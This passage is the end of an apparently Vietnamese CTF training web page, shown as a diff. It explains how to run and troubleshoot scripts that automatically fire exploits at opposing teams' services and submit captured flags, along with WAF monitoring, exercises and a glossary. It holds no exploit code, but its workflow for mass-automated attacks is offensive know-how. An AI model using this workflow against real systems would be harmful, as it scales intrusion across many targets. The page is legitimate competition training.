+    <div class="srow"><span class="n">5</span><div><div class="t">Round 2 reset (sau ~30 phút)</div><div class="d">Lặp lại bước 2-4 — <code>flags.txt</code>/<code>submitted.txt</code> giữ nguyên lịch sử, không cần xóa (khử trùng tự lo bằng việc so sánh 2 file).</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / THEO DÕI WAF SONG SONG VỚI TẤN CÔNG</div>
+  <h2>Không chỉ tấn công — phải canh phòng thủ cùng lúc</h2>
+  <p>Khi chạy <code>run_all_exploits.py</code>, dành 1-2 phút mỗi round để:</p>
+  <ul>
+    <li>Xem traffic log UI WAF của mình — có pattern tấn công lạ từ đội khác không (dấu hiệu họ đã tìm ra cùng
+    lỗ hổng bạn đang khai thác)?</li>
+    <li>Nếu thấy pattern tấn công rõ ràng, viết rule chặn NGAY (xem bài WAF Bypass & Rules) — rule giữ nguyên
+    qua các round (theo quy chế), nên viết sớm là có lợi dài hạn, không cần viết lại mỗi round.</li>
+    <li>Kiểm tra rule cũ có đang chặn nhầm SVC của chính mình không (xem Dashboard SVC có giảm bất thường
+    đúng lúc mới thêm rule).</li>
+  </ul>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi quy trình tự động hóa trục trặc</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>submit_flags.py báo lỗi 429 dù đã throttle</td><td>Có 2 tiến trình submit chạy đồng thời cộng dồn vượt giới hạn, hoặc MAX_PER_MINUTE đặt quá sát 30</td><td>Đảm bảo chỉ 1 instance submit_flags.py chạy, hạ MAX_PER_MINUTE xuống 20-25 để có biên an toàn</td></tr>
+    <tr><td>run_all_exploits.py chạy rất chậm, treo lâu</td><td>Một đội service bị down/không phản hồi, không có timeout làm cả batch chờ</td><td>Luôn đặt <code>timeout=5</code> (hoặc tương tự) cho MỌI request, dùng ThreadPoolExecutor để 1 đội chậm không chặn các đội khác</td></tr>
+    <tr><td>Nộp nhầm flag của chính đội mình</td><td>teams.txt vô tình chứa IP nhà mình</td><td>Luôn loại bỏ IP nhà mình khỏi teams.txt trước khi chạy (nộp cờ nhà = 0 điểm ATK + bị trừ 2×BP)</td></tr>
+    <tr><td>flags.txt phình to, không biết cái nào đã nộp</td><td>Không dùng submitted.txt để khử trùng</td><td>Luôn so sánh 2 file (như script mục 08.B), không tự tay theo dõi</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào cách này đủ / cần điều chỉnh</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Đã xác nhận TAY ít nhất 1 lần rằng exploit hoạt động trên service thật trước khi đưa vào <code>run_all_exploits.py</code> — tự động hóa cái CHƯA xác nhận chỉ tốn thời gian debug giữa trận.</td></tr>
+    <tr><td>❌</td><td>Đừng tự động hóa tấn công vào lỗ hổng mới tìm, chưa test tay — nguy cơ cao gây lỗi ngoài ý muốn trên service đối thủ (có thể bị hiểu nhầm là phá hoại, vi phạm Điều 6.1.f).</td></tr>
+    <tr><td>❌</td><td>Không nên chạy exploit liên tục không giới hạn (vòng lặp vô hạn gửi hàng trăm request/giây) — ranh giới mong manh với hành vi DoS, dù không cố ý.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> viết khung <code>teams.txt</code> + <code>run_all_exploits.py</code> +
+  <code>submit_flags.py</code> với 1 exploit giả lập (dùng chính 1 bài SQLi/SSTI đã học), test trên môi trường
+  giả (vd server local tự dựng).</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nếu chưa có service thật để test, tạo 1 Flask app giả đơn giản có
+  đúng lỗ hổng đó để luyện chạy script, không cần đợi tới ngày thi mới thử lần đầu.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> thêm 1 lỗ hổng thứ 2 vào <code>EXPLOITS</code> list, xác nhận script tự
+  thử lần lượt từng exploit cho tới khi 1 cái ăn (không dừng lại ở exploit đầu tiên nếu nó thất bại).</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Đảm bảo vòng lặp <code>for exploit in EXPLOITS</code> có
+  <code>try/except</code> riêng từng exploit, không để 1 exploit lỗi làm dừng cả vòng lặp.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> thiết kế cách tự động phát hiện "round mới bắt đầu" (không cần tự canh
+  đồng hồ/bấm tay) dựa trên lịch 10 round đã công bố trước (Quy chế Hình 1), để tự kích hoạt
+  <code>run_all_exploits.py</code> đúng lúc.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Tính trước thời điểm bắt đầu mỗi round (08h30 + tổng thời lượng các
+  round trước) thành 1 list timestamp, dùng vòng lặp kiểm tra <code>time.time()</code> mỗi vài giây, kích hoạt
+  khi vượt qua mốc tiếp theo — nhưng vẫn nên có nút bấm tay dự phòng vì lịch thực tế có thể trễ so với dự kiến.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Throttle</td><td>Giới hạn tốc độ thực hiện 1 hành động (ở đây là nộp flag) trong 1 khoảng thời gian.</td></tr>
+    <tr><td>Khử trùng (deduplication)</td><td>Loại bỏ các giá trị đã xử lý trước đó, tránh lặp lại (ở đây: không nộp lại flag đã nộp).</td></tr>
+    <tr><td>ThreadPoolExecutor</td><td>Công cụ Python chạy nhiều tác vụ song song bằng luồng (thread), dùng để quét nhiều đội đồng thời thay vì tuần tự.</td></tr>
+    <tr><td>Level 2</td><td>Lỗ hổng/thử thách bổ sung mở ra từ round 4 trở đi (theo Quy chế), cần đọc source lại để tìm.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Tài liệu liên quan:</strong> mọi bài kỹ thuật trước (SQLi, Command Injection,
+  SSTI, LFI, File Upload, XXE, IDOR, JWT, Type Juggling, Mass Assignment, Race Condition, Session Forge, Recon,
+  WAF) — bài này là nơi "ráp" toàn bộ exploit của các bài đó lại thành 1 quy trình vận hành.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("ad-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("ad-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
